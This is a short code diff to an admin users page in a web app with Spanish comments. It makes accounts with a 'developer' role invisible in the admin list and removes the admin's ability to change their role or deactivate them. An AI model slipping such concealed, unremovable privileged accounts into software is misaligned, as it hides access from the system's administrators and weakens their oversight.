@@ -59,7 +59,10 @@ export default async function UsuariosPage() {
     (profiles ?? []).map((p: { id: string; nombre: string | null; rol: string }) => [p.id, p])
   );
 
-  const usuarios = (authData?.users ?? []).map(u => ({
+  const usuarios = (authData?.users ?? []).filter(u => {
+    const perfil = profileMap[u.id];
+    return perfil?.rol !== "developer"; // developer es invisible para el panel de admin
+  }).map(u => ({
     id: u.id,
     email: u.email ?? "—",
     nombre: profileMap[u.id]?.nombre ?? null,
@@ -181,9 +184,9 @@ export default async function UsuariosPage() {
                 </p>
               </div>
 
-              {/* Rol actual (badge si es self, selector si no) */}
+              {/* Rol actual (badge si es developer o self, selector si no) */}
               <div className="shrink-0">
-                {u.id === me?.id
+                {u.rol === "developer" || u.id === me?.id
                   ? <RolBadge rol={u.rol} />
                   : (
                     <RolSelector
@@ -197,13 +200,18 @@ export default async function UsuariosPage() {
                 }
               </div>
 
-              {/* Desactivar */}
+              {/* Desactivar — oculto para developer */}
               <div className="shrink-0">
-                <BanToggle
-                  userId={u.id}
-                  esBaneado={u.baneado}
-                  esSelf={u.id === me?.id}
-                />
+                {u.rol === "developer"
+                  ? <div className="w-[88px]" />
+                  : (
+                    <BanToggle
+                      userId={u.id}
+                      esBaneado={u.baneado}
+                      esSelf={u.id === me?.id}
+                    />
+                  )
+                }
               </div>
             </div>
           ))}
